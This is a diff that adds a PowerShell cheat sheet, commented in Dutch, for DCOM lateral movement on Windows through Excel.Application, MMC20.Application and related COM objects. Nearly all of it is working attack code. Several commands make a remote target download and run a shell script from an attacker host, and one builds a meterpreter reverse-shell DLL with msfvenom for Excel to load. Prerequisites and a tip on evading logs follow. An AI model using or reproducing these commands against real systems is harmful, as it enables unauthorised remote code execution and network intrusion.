@@ -1,0 +1,35 @@
+# DCOM Lateral Movement via Excel.Application
+# === Excel.Application (poort 135 + dynamische RPC poorten) ===
+# PowerShell - Remote code execution via Excel macro:
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "TARGET_IP"))
+$com.DisplayAlerts = $false
+$wb = $com.Workbooks.Add()
+$ws = $wb.Worksheets.Item(1)
+$ws.Cells.Item(1,1).Value = "=cmd|'/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/shell.ps1'')'|"
+$ws.Cells.Item(1,1).Activate()
+# === Excel.Application - DDEInitiate methode ===
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "TARGET_IP"))
+$com.DDEInitiate("cmd", "/c powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')")
+# === Excel.Application - RegisterXLL methode ===
+# Genereer DLL payload:
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=443 -f dll -o evil.xll
+# Upload naar target:
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "TARGET_IP"))
+$com.RegisterXLL("\\ATTACKER_IP\share\evil.xll")
+# === Andere DCOM objecten voor lateral movement ===
+# ShellWindows:
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("Shell.Application", "TARGET_IP"))
+# MMC20.Application (zie lateral_dcom):
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET_IP"))
+$com.Document.ActiveView.ExecuteShellCommand("powershell", $null, "-ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')", "7")
+# ShellBrowserWindow:
+$com = [activator]::CreateInstance([type]::GetTypeFromProgID("ShellBrowserWindow", "TARGET_IP"))
+$com.Document.Application.ShellExecute("powershell", "-ep bypass -c IEX(...)", "", "", 0)
+# === Vereisten ===
+# - Poort 135 (RPC) open op target
+# - Lokale admin rechten op target
+# - DCOM moet ingeschakeld zijn (standaard aan)
+# - Firewall moet dynamische RPC poorten toestaan
+# Tip: DCOM genereert minder logs dan PsExec/WMI
+# Tip: Excel.Application werkt alleen als Office geinstalleerd is
+# Tip: MMC20.Application is beschikbaar op alle Windows versies
